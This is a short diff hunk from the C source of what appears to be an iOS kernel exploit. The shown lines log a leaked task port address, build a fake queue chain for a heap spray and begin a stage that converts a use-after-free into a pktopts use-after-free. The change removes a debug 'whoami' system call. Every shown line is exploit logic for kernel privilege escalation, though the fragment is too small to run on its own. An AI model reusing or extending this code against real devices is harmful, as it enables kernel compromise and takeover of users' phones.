@@ -319,7 +319,6 @@ stage1:
     uint64_t task_port = *(uint64_t*)(next_spray_entry + 1);
     cicuta_log("task_port: 0x%llx", task_port);
     set_fake_queue_chain_for_fake_element_spray(task_port + offsetof(kport_t, ip_context) - 24, task_port + offsetof(kport_t, ip_context) - 16);
-    system("whoami");
     cicuta_log(getuid());
     cicuta_log("Stage 3: Convert uaf into pktopts uaf");
     ipc_voucher_t redeemed_voucher = IPC_VOUCHER_NULL;
